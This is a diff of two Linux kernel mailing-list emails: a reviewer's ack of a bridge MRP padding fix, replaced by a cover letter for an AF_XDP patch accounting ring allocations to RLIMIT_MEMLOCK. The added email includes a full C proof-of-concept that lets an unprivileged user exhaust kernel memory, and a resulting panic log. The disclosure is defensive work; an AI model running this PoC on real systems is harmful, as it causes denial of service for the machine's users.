@@ -1,144 +1,358 @@
-Received: from mail-wm1-f47.google.com (mail-wm1-f47.google.com [209.85.128.47])
+Received: from mail-pz2-f0.google.com (mail-pz2-f0.google.com [74.125.228.0])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 69175441600
-	for <netdev@vger.kernel.org>; Thu, 30 Jul 2026 15:27:46 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.47
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A9C50382F01
+	for <netdev@vger.kernel.org>; Thu, 30 Jul 2026 15:39:06 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.0
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785425268; cv=none; b=tFEvKMuJUD7+v+6Uu2mt6ufvAlqOSDfK1f+24NXy7sAfY+gZx3aQG60hOxHqRCA0Cz4TQ2/h8FTKVPsal2Zad3+osYdsG//GAEb6hvGRKxD4PaQ90rZIyjy0q3lCpTQxfLMctykRmJYYD0xEJa5viFc0p7nckDrx+QRoMYBZMbs=
+	t=1785425948; cv=none; b=L+6oAQjCJ+1IiFHwJJhymXhtQ7+ArjvIB1LvumHbh1JzUVLMvDryAjj03opOEC/LVZyoZz+Ajw4Zywz0qExqbt7iEfAebv7qPnAU/mQpYmW4ljNPkikX2QhOGsJSMSnHycaG3jk03qknJxYM9PZN5Gp19Mf0f0iljAN/HanmM08=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785425268; c=relaxed/simple;
-	bh=d5RXFfVRX5p3oscQXB9FNGQJzjxxqOI0ZyUQ/yhbbX0=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=chjVj3TmY4BWaUrzUFJn/HEJJRUfPeJdn6ICadA3bq1jszkCUFagZYU1XcnATBvlDrf92eYGPFLu+K3YJ1sz4iWNeyOOmRFAVgD1VLjJuzDhqImD2WtjoTR5L+hAdOzZHYTxqqyr8adM/WhxgMl0foMLCDqlvCYnwxSebCt200A=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=blackwall.org; spf=none smtp.mailfrom=blackwall.org; dkim=pass (2048-bit key) header.d=blackwall.org header.i=@blackwall.org header.b=MvUYPrTR; arc=none smtp.client-ip=209.85.128.47
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=blackwall.org
-Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=blackwall.org
+	s=arc-20240116; t=1785425948; c=relaxed/simple;
+	bh=mHr1CM5Sk4EUY18QWAMNqfb5KTW6Q9HGR/ZiUdA+Be8=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=L5DJmn8aGDroAas8cd+SJxP5TZ7E501Uik7WnSXrzZ0lrnKGnnOFbCPZtrTK3edajCGox6BwXnQt7+JCpy//80CSJAs68ek60W+omU+mxT+884wIjsBjK/9MF9PvbKJJTAyPfRP4NpbC5a/tVBApaSjUp+khlB/Sowh9sP3MjpA=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=VeHThG9r; arc=none smtp.client-ip=74.125.228.0
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=blackwall.org header.i=@blackwall.org header.b="MvUYPrTR"
-Received: by mail-wm1-f47.google.com with SMTP id 5b1f17b1804b1-4954a32cf1eso11470295e9.3
-        for <netdev@vger.kernel.org>; Thu, 30 Jul 2026 08:27:46 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="VeHThG9r"
+Received: by mail-pz2-f0.google.com with SMTP id 41be03b00d2f7-c888c001628so1299046a12.0
+        for <netdev@vger.kernel.org>; Thu, 30 Jul 2026 08:39:06 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=blackwall.org; s=google; t=1785425264; x=1786030064; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=nzJUatZRCgVEofo3LM1zenQhlJFklBY9WtRFTuod4dQ=;
-        b=MvUYPrTRlUzfqhGO2lvbt+DzpOn3ZZ9R4BWLe3W386eVczuQ5jyFZYWflnlgJjiOcR
-         SMbwCzv6Ap6noHsptRWREdy0iDN5UjtZ+Jv5Au2VasahB3UTot8Dwu1JAagLBlPjTR9m
-         DX4OZThyja3k403hIVqCCjLHcE2dkAh65yLbCFZsxLI4A139S6MnFzpsrOT5rY2yOhQl
-         K5bgvN03sIPLtSMygse2btmEwDDyZSY9LOkmXFUowJyHkI32+Ng5pvcyNcnTugCCPHo6
-         LgXVymOwrinsKiUoKw8QNSvafvSU7V9c/uAcpRCSQ/ArLuhNewhUjHQ/jOYn6fRWlOv0
-         reew==
+        d=nebusec.ai; s=google; t=1785425946; x=1786030746; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=2xFtdf5ZIQNT/wYxekdvrv76PwSYt6hnXMFlyB8qKPk=;
+        b=VeHThG9rrzCcwgc7zCd+jklnrw78werZhGSVoRDiaecAUPSfY7Mj88u4WILb/DRhvD
+         I+M978Txd9UzOscW+qbSgkmLLe8twDZhhG8B3GVzrzgtMp9BzWD8dBPCK5SW45vBHKvJ
+         ZsY9nmJqy3SxlPP2SALJU6Apvvc/Yu0G0kf+2JIRJAFKSISIplbLodPTRmYcEsrGHF75
+         SSO7HiBWMAzxUQYJlPush6FWMPUWRVZeBXKqaLU67NBykKO6Z767kidVPYiDMYIMsK95
+         z+OR2H3MXVhDqGMNnBZbzjco4N7nKz75h3aiDjr9sndfHxKidJFEs8uXDio7THRHt6OV
+         1fow==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785425264; x=1786030064;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=nzJUatZRCgVEofo3LM1zenQhlJFklBY9WtRFTuod4dQ=;
-        b=auSmZ3kpLfB61eCamGEDCXOROhB1oKkmCn/tYdj+wU/wJ/O4GEYLb1l5jD/CMU3cEw
-         sjn05gqZLrUb4cvvF7XNX1VKRUAU4nV6LIuk36t0wxWEu3MwvVzlmpZXgq5RkiLwLN0v
-         xmMTNEDFeqwCUnR9Jc0fi2YrpjZgp2O7zoJERUV21KyLUXh7P9JxwUAFvILQYbkUpv5p
-         BqKJxJIBRIMj0GiOCcUKMZ59fYzD3BxcosUqj7k2j+rpo18spaXCICJvIsMCgqVVjdHU
-         t8EJOmHoikqigC/tkm5hKccDW4bGqiTkOZVs2Ns235S7b4cNNx5OlpvSCxCmus9SWzDc
-         3Akw==
-X-Gm-Message-State: AOJu0YyLSrOEf9F1PXU0RnKaiYIrCWg2KmaO4adnEdlwdt7SHVjMXEH6
-	wdEQ3mnC1xD3JVKb15PeaGgQbVONL7wR//Wo/gUMgEsynulYRU7EMTKbi5mTsbxd8d8=
-X-Gm-Gg: AR+sD10ExiLeVneGVRfbglrG8qRv6BIfhv8jkB8st4/CHf4gRJhqdhLl1kKlqrbZzIQ
-	x1i8+JEHYnNXJ6JNd2xZIZgeMf1lqvaFkJZP5F1Nrxi4VjJ2Rek7Pr087wbbX2CWu/QCoy1IBGZ
-	Cfiy1j8nawbMq1jG7dAJiz8HfNaHPP2lqDIKZy+vNwT2iuA10eGxMW3y7+X+ZLNtgcrTP7Wlg5m
-	gpoWK9oclnZHk9nS0m5KvI3pspiINwhqufJZgeA1EHyufc0NEeAiiZMIx0VF4tn2K+gA0rq5i/C
-	Uag4eqmYVhTEXuI4uDZ51qlzjc0HWEAQXG+Y+2s8M9lDwDxa4hJ7qiQwvt27ExzdZ17xfdPzwRD
-	+DFsIgn+JIwD/gOEa9Ef2j1p6zf6eiuQJRqXlp0I2RUdT8EArDQ5EUyAXZ1mTePNO8/O/j6O6s3
-	we+pYChMUx/9NsC/Qvw2i763Iv1FDgPYLKVjAsLulOoULiigM3yvRpcxI=
-X-Received: by 2002:a7b:cc89:0:b0:495:6f6b:fb75 with SMTP id 5b1f17b1804b1-49800ebba08mr29432035e9.38.1785425264161;
-        Thu, 30 Jul 2026 08:27:44 -0700 (PDT)
-Received: from localhost ([109.160.74.77])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-498011fd5fesm62954505e9.7.2026.07.30.08.27.42
+        d=1e100.net; s=20251104; t=1785425946; x=1786030746;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=2xFtdf5ZIQNT/wYxekdvrv76PwSYt6hnXMFlyB8qKPk=;
+        b=hgy5DFB3alwbP4+nSFwTEYx1WTA2f6cU0jciC7XbGmrHy8QUvn7Uum2qNND4tVCaXj
+         drUEviU2mgKA7xAdQDuJuyhc4suH5bh1jQie/qutNcQ//vzmFhQjqjdx6qTwXW0UCc2f
+         ba45us+mDRHmgKxo7BgZ3wpFSs57Rs5IxMn7iWD3oCEva6uTX48gQ79LjXMjjNRm2jPM
+         RvJ+npdOfvgMLpZg0jbBJh44pWnlIfTyBi1ndlNTeAqnZ2VLME0fqHLjlZG5BDeSuPWG
+         lJlQuHD9rA3cW6LNHbbjoEGTV8xU9JD8mG8FIZlARt63D0IguUCtc4AqwN6Ewzsu/A44
+         f9yQ==
+X-Gm-Message-State: AOJu0YyLFifo9efZzO1KB33scoqEbrt/f3Y63kZwXfcnzCm6JdtcmlKv
+	mC9vBpGVYpJw8SfRY8Cu30ESo1laUtEA2wsnXBHfrkUlqj0XYcd06l1Pu6Ciy49enxeiKEeodje
+	XudVn/43Kr6I=
+X-Gm-Gg: AR+sD109VdbT2Sut3SEsURk7wuKO1TayjVYDnEKVBbutE47LukJJFwJUfF/DVPX//eQ
+	AByTnQ7sFVw1eA6qbw/bPMFWd4uV+k9OOSyTouw9BwM/L3x4ptMLF+Xznilf1y93F6HHJxmVKMI
+	xKUXH6vFKUldbTNxYaf+tHqRzdQ6tywhnnShSDJBGR6PLZ8MjrBiqQMttGWoCdh9JjaixUTXAOP
+	KM8O+EdDsGSfjlGRCS5GVNL2mmahR1z/MTbWV1JbiR49RceY8DrKV+W125d6Tc9gq2PlcIQouhj
+	Y2HzAHdYznEIp90YEdi1V2AuRK4TNAR6S/jMNkRDlbOC82EzQ2I8ERT4ryUcFZPpwTkhEQNoZD8
+	IpcLvQRuEvHNhjm4vP7ZqNp6FDK2YgzGgJhjPz6bP6hwcHjbCULR6WXJAdAGWlq2KPsc33IRvkQ
+	7RXrSnirurw6d2UW6ZUoDD713HpAB/yNIE6TK1KLXrCLJbHpeBPPfhBX8f9iKho69sDTvnNGI=
+X-Received: by 2002:a05:6a00:1d90:b0:841:dca1:8b69 with SMTP id d2e1a72fcca58-84ebc1f62f3mr2902779b3a.5.1785425945595;
+        Thu, 30 Jul 2026 08:39:05 -0700 (PDT)
+Received: from localhost.localdomain ([115.192.250.185])
+        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cbdb824f077sm2242214a12.11.2026.07.30.08.39.00
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 30 Jul 2026 08:27:43 -0700 (PDT)
-Date: Thu, 30 Jul 2026 18:27:41 +0300
-From: Nikolay Aleksandrov <razor@blackwall.org>
-To: Baul Lee <baul.lee@xbow.com>
-Cc: netdev@vger.kernel.org, bridge@lists.linux.dev,
-	linux-kernel@vger.kernel.org, Ido Schimmel <idosch@nvidia.com>,
-	Andrew Lunn <andrew@lunn.ch>,
-	"David S . Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
-	Simon Horman <horms@kernel.org>, stable@vger.kernel.org
-Subject: Re: [PATCH net v2] net: bridge: mrp: fix uninitialised bytes on the
- wire
-Message-ID: <amttbcdZkuWVSdLE@penguin>
-References: <20260726062518.43774-1-baul.lee@xbow.com>
- <20260729131941.10254-1-baul.lee@xbow.com>
+        Thu, 30 Jul 2026 08:39:05 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org,
+	bpf@vger.kernel.org
+Cc: magnus.karlsson@intel.com,
+	maciej.fijalkowski@intel.com,
+	sdf@fomichev.me,
+	davem@davemloft.net,
+	edumazet@google.com,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	ast@kernel.org,
+	daniel@iogearbox.net,
+	hawk@kernel.org,
+	john.fastabend@gmail.com,
+	vega@nebusec.ai,
+	zihanx@nebusec.ai
+Subject: [PATCH net v2 0/1] xsk: fix unaccounted ring allocations causing memory exhaustion
+Date: Thu, 30 Jul 2026 15:38:31 +0000
+Message-ID: <20260730153832.11238-1-zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20260729131941.10254-1-baul.lee@xbow.com>
+Content-Transfer-Encoding: 8bit
 
-On Wed, Jul 29, 2026 at 10:19:41PM +0900, Baul Lee wrote:
-> br_mrp_alloc_test_skb() builds MRP test frames on an skb from
-> dev_alloc_skb(), which does not clear the linear data area.  On the MRA
-> ring-role branch the sub-option TLV header is appended with
-> 
-> 	sub_tlv = skb_put(skb, sizeof(*sub_tlv));
-> 	sub_tlv->type = BR_MRP_SUB_TLV_HEADER_TEST_AUTO_MGR;
-> 
-> so sub_tlv->length is never written, and the two trailing alignment bytes
-> are appended with a bare skb_put() that does not clear them either.  The
-> neighbouring oui and sub_opt regions are explicitly zeroed, so three
-> uninitialised bytes are left in every MRA MRP_Test frame that goes out.
-> 
-> Put the sub-option TLV header and the alignment padding in a single
-> skb_put_zero(), which clears both.  The AUTO_MGR sub-TLV carries no
-> payload, so the zeroed length field is already the value it should have.
-> 
-> Fixes: f7458934b079 ("net: bridge: mrp: Update the Test frames for MRA")
-> Suggested-by: Nikolay Aleksandrov <razor@blackwall.org>
-> Cc: stable@vger.kernel.org
-> Signed-off-by: Baul Lee <baul.lee@xbow.com>
-> ---
-> v2:
->  - fold the alignment padding into a single skb_put_zero() for the
->    sub-option TLV header, dropping the explicit length assignment and the
->    second skb_put() (Nikolay Aleksandrov)
->  - drop the paragraph about observing the leak, and the Reported-by tags
-> 
-> Link to v1: https://lore.kernel.org/netdev/20260726062518.43774-1-baul.lee@xbow.com/
-> 
->  net/bridge/br_mrp.c | 6 ++----
->  1 file changed, 2 insertions(+), 4 deletions(-)
-> 
-> diff --git a/net/bridge/br_mrp.c b/net/bridge/br_mrp.c
-> index 179d2470b..ef16d0703 100644
-> --- a/net/bridge/br_mrp.c
-> +++ b/net/bridge/br_mrp.c
-> @@ -224,11 +224,9 @@ static struct sk_buff *br_mrp_alloc_test_skb(struct br_mrp *mrp,
->  		sub_opt = skb_put(skb, sizeof(*sub_opt));
->  		memset(sub_opt, 0x0, sizeof(*sub_opt));
->  
-> -		sub_tlv = skb_put(skb, sizeof(*sub_tlv));
-> -		sub_tlv->type = BR_MRP_SUB_TLV_HEADER_TEST_AUTO_MGR;
-> -
->  		/* 32 bit alligment shall be ensured therefore add 2 bytes */
-> -		skb_put(skb, MRP_OPT_PADDING);
-> +		sub_tlv = skb_put_zero(skb, sizeof(*sub_tlv) + MRP_OPT_PADDING);
-> +		sub_tlv->type = BR_MRP_SUB_TLV_HEADER_TEST_AUTO_MGR;
->  	}
->  
->  	br_mrp_skb_tlv(skb, BR_MRP_TLV_HEADER_END, 0x0);
-> -- 
-> 2.53.0
-> 
+Hi Linux kernel maintainers,
 
-You should not send patches as replies, they should be sent on
-their own. Aside from that the patch looks good to me:
+We found and validated a issue in net/xdp/xsk_queue.c. The bug is reachable by a
+non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-Acked-by: Nikolay Aleksandrov <razor@blackwall.org>
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+
+---- details below ----
+
+Bug details:
+
+AF_XDP lets user space allocate RX, TX, UMEM fill and UMEM completion
+rings with setsockopt() and mmap them into the process. The shared
+xskq_create() helper allocates the ring backing memory, but unlike UMEM
+registration it does not account those pages against RLIMIT_MEMLOCK /
+user->locked_vm.
+
+As a result, a process with CAP_NET_RAW in a user and network namespace
+can request very large rings and pin a large amount of kernel memory
+before bind or any packet I/O. In our original report the resulting OOM
+ended in a panic because that guest had panic_on_oom enabled. The panic
+was only the environment-specific end result; the bug itself is the
+missing resource boundary that lets ring allocations consume excessive
+memory in the first place.
+
+The first version tried to bound these allocations with sysctl_optmem_max,
+but that was the wrong resource model. We also evaluated a memcg-accounted
+vmalloc path as suggested, but memcg attribution by itself did not impose
+a default enforcement boundary in our validation setup. AF_XDP already
+uses RLIMIT_MEMLOCK / user->locked_vm to bound pinned UMEM pages, and the
+ring pages are likewise user-controlled, mmapable and long-lived. This
+version therefore accounts AF_XDP ring allocations with the existing
+mm_account_pinned_pages() helper and unaccounts them when the queue is
+destroyed, so ring memory is constrained by the same default limit model
+already used for AF_XDP UMEM pages.
+
+Reproducer:
+
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+#include <errno.h>
+#include <linux/if_xdp.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/sysinfo.h>
+#include <unistd.h>
+
+static void print_meminfo(const char *tag)
+{
+	struct sysinfo info;
+
+	if (sysinfo(&info) == 0) {
+		unsigned long long total = (unsigned long long)info.totalram * info.mem_unit;
+		unsigned long long free = (unsigned long long)info.freeram * info.mem_unit;
+		unsigned long long avail = (unsigned long long)info.bufferram * info.mem_unit;
+
+		fprintf(stderr,
+			"%s: total=%llu MiB free=%llu MiB buff=%llu MiB\n",
+			tag, total >> 20, free >> 20, avail >> 20);
+	}
+}
+
+static int set_ring(int fd, int optname, unsigned int entries, const char *name)
+{
+	int ret;
+
+	ret = setsockopt(fd, SOL_XDP, optname, &entries, sizeof(entries));
+	if (ret) {
+		fprintf(stderr, "setsockopt(%s, %u) failed: %s\n",
+			name, entries, strerror(errno));
+		return -1;
+	}
+
+	fprintf(stderr, "allocated %s ring with %u entries on fd=%d\n",
+		name, entries, fd);
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+	static const struct {
+		int optname;
+		const char *name;
+	} rings[] = {
+		{ XDP_RX_RING, "XDP_RX_RING" },
+		{ XDP_TX_RING, "XDP_TX_RING" },
+		{ XDP_UMEM_FILL_RING, "XDP_UMEM_FILL_RING" },
+		{ XDP_UMEM_COMPLETION_RING, "XDP_UMEM_COMPLETION_RING" },
+	};
+	unsigned int entries = 1U << 25;
+	int nsockets = 8;
+	int *fds;
+	int i, j;
+
+	if (argc > 1)
+		entries = strtoul(argv[1], NULL, 0);
+	if (argc > 2)
+		nsockets = atoi(argv[2]);
+	if (!entries || !nsockets) {
+		fprintf(stderr, "usage: %s [entries power-of-two] [socket_count]\n",
+			argv[0]);
+		return 1;
+	}
+
+	fds = calloc(nsockets, sizeof(*fds));
+	if (!fds) {
+		perror("calloc");
+		return 1;
+	}
+
+	fprintf(stderr,
+		"AF_XDP ring exhaustion PoC: entries=%u sockets=%d pid=%d\n",
+		entries, nsockets, getpid());
+	print_meminfo("before");
+
+	for (i = 0; i < nsockets; i++) {
+		fds[i] = socket(AF_XDP, SOCK_RAW, 0);
+		if (fds[i] < 0) {
+			fprintf(stderr, "socket(AF_XDP) failed at index %d: %s\n",
+				i, strerror(errno));
+			break;
+		}
+
+		fprintf(stderr, "opened AF_XDP socket %d fd=%d\n", i, fds[i]);
+		for (j = 0; j < (int)(sizeof(rings) / sizeof(rings[0])); j++) {
+			if (set_ring(fds[i], rings[j].optname, entries, rings[j].name))
+				goto out;
+			print_meminfo(rings[j].name);
+		}
+	}
+
+out:
+	fprintf(stderr, "holding allocations open; press Ctrl-C or wait\n");
+	sleep(600);
+
+	for (i = 0; i < nsockets; i++) {
+		if (fds[i] >= 0)
+			close(fds[i]);
+	}
+	free(fds);
+	return 0;
+}
+------END poc.c--------
+
+----BEGIN crash log----
+[  112.547501][  T953] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
+[  112.548314][  T953] CPU: 2 UID: 1028 PID: 953 Comm: poc Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
+[  112.549150][  T953] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  112.550090][  T953] Call Trace:
+[  112.550346][  T953]  <TASK>
+[  112.550569][  T953]  panic (kernel/panic.c:1101)
+[  112.550876][  T953]  ? __pfx_panic (include/linux/nmi.h:163)
+[  112.551222][  T953]  ? __pfx_lock_release+0x10/0x10
+[  112.551642][  T953]  out_of_memory (mm/oom_kill.c:1193)
+[  112.552013][  T953]  ? __alloc_pages_slowpath.constprop.0+0xa0f/0x2800
+[  112.552538][  T953]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
+[  112.552919][  T953]  ? __pfx_mutex_trylock (kernel/locking/mutex.c:582 (discriminator 1))
+[  112.553335][  T953]  __alloc_pages_slowpath.constprop.0+0x1eb8/0x2800
+[  112.553854][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.554295][  T953]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x10
+[  112.554819][  T953]  ? local_clock_noinstr (kernel/sched/clock.c:307 (discriminator 1))
+[  112.555214][  T953]  ? lock_release+0x687/0xc90
+[  112.555584][  T953]  ? __pfx___might_resched+0x10/0x10
+[  112.556006][  T953]  __alloc_pages_noprof (mm/page_alloc.c:5221 (discriminator 1))
+[  112.556409][  T953]  ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4967)
+[  112.556860][  T953]  alloc_pages_mpol_noprof+0x1b1/0x430
+[  112.557289][  T953]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
+[  112.557759][  T953]  ? __pfx___might_resched+0x10/0x10
+[  112.558179][  T953]  __vmalloc_node_range_noprof (include/linux/workqueue.h:699 include/linux/workqueue.h:760 mm/vmalloc.c:3801 mm/vmalloc.c:3941 mm/vmalloc.c:4082)
+[  112.558628][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
+[  112.558990][  T953]  ? __pfx___vmalloc_node_range_noprof (mm/vmalloc.c:4143 (discriminator 2))
+[  112.559508][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.559950][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
+[  112.560346][  T953]  vmalloc_user_noprof (mm/vmalloc.c:4484 (discriminator 4))
+[  112.560731][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
+[  112.561096][  T953]  xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
+[  112.561434][  T953]  xsk_setsockopt (net/xdp/xsk.c:1198)
+[  112.561799][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.562227][  T953]  ? aa_sk_perm+0x131/0x8a0
+[  112.562573][  T953]  ? __pfx_xsk_setsockopt (include/linux/refcount.h:461)
+[  112.562975][  T953]  ? security_file_permission (security/security.c:2424 (discriminator 18))
+[  112.563420][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.563850][  T953]  ? vfs_write (fs/read_write.c:799)
+[  112.564222][  T953]  do_sock_setsockopt (net/socket.c:395)
+[  112.564610][  T953]  ? __pfx_do_sock_setsockopt (net/socket.c:282 (discriminator 1))
+[  112.565046][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.565490][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.565926][  T953]  ? __do_sys_sysinfo (kernel/sys.c:2202)
+[  112.566333][  T953]  ? __pfx___do_sys_sysinfo (kernel/sys.c:3073)
+[  112.566758][  T953]  __sys_setsockopt (net/socket.c:2396)
+[  112.567144][  T953]  __x64_sys_setsockopt (arch/x86/include/asm/compat.h:94 (discriminator 1) arch/x86/include/asm/compat.h:100 (discriminator 1) net/socket.c:2505 (discriminator 1))
+[  112.567538][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.567967][  T953]  ? trace_hardirqs_on+0x5b/0x110
+[  112.568366][  T953]  do_syscall_64 (arch/x86/include/asm/entry-common.h:43 (discriminator 3) include/linux/irq-entry-common.h:100 (discriminator 3) include/linux/entry-common.h:174 (discriminator 3) arch/x86/entry/syscall_64.c:89 (discriminator 3))
+[  112.568721][  T953]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[  112.569187][  T953] RIP: 0033:0x7e2b01ae42ba
+[  112.569541][  T953] Code: 48 83 ec 10 48 63 c9 48 63 ff 45 89 c9 6a 2c e8 fc d3 f7 ff 48 83 c4 18 c3 0f 1f 80 00 00 00 00 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 06 c3 0f 1f 44 00 00 48 8b 15 21 2b 0d 00 f7
+All code
+========
+   0:	48 83 ec 10          	sub    $0x10,%rsp
+   4:	48 63 c9             	movslq %ecx,%rcx
+   7:	48 63 ff             	movslq %edi,%rdi
+   a:	45 89 c9             	mov    %r9d,%r9d
+   d:	6a 2c                	push   $0x2c
+   f:	e8 fc d3 f7 ff       	call   0xfffffffffff7d410
+  14:	48 83 c4 18          	add    $0x18,%rsp
+  18:	c3                   	ret
+  19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+  20:	49 89 ca             	mov    %rcx,%r10
+  23:	b8 36 00 00 00       	mov    $0x36,%eax
+  28:	0f 05                	syscall
+  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
+  30:	77 06                	ja     0x38
+  32:	c3                   	ret
+  33:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+  38:	48 8b 15 21 2b 0d 00 	mov    0xd2b21(%rip),%rdx        # 0xd2b60
+  3f:	f7                   	.byte 0xf7
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
+   6:	77 06                	ja     0xe
+   8:	c3                   	ret
+   9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+   e:	48 8b 15 21 2b 0d 00 	mov    0xd2b21(%rip),%rdx        # 0xd2b36
+  15:	f7                   	.byte 0xf7
+[  112.571019][  T953] RSP: 002b:00007ffc66ef6958 EFLAGS: 00000283 ORIG_RAX: 0000000000000036
+[  112.571683][  T953] RAX: ffffffffffffffda RBX: 000055d2e378619e RCX: 00007e2b01ae42ba
+[  112.572300][  T953] RDX: 0000000000000005 RSI: 000000000000011b RDI: 0000000000000003
+[  112.572901][  T953] RBP: 0000000000000000 R08: 0000000000000004 R09: 0000000000000000
+[  112.573505][  T953] R10: 00007ffc66ef697c R11: 0000000000000283 R12: 000055d2e3787dc0
+[  112.574127][  T953] R13: 0000000004000000 R14: 00007ffc66ef697c R15: 0000000000000003
+[  112.574744][  T953]  </TASK>
+[  112.575596][  T953] Kernel Offset: disabled
+[  112.575937][  T953] Rebooting in 10 seconds..
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+changes in v2:
+  - replace the socket optmem limit proposal with RLIMIT_MEMLOCK /
+    user->locked_vm accounting via mm_account_pinned_pages()
+  - drop the earlier socket/pool lifetime coupling changes and keep the
+    final code diff limited to xsk_queue.c and xsk_queue.h
+  - clarify that panic_on_oom only affected the observed end result, while
+    the bug is the missing resource boundary for ring allocations
+  - explain why memcg attribution alone was not sufficient as the default
+    enforcement boundary in the validated setup
+  - v1 Link: https://lore.kernel.org/all/cover.1785313094.git.zihanx@nebusec.ai/
+
+Zihan Xi (1):
+  xsk: account ring allocations to RLIMIT_MEMLOCK
+
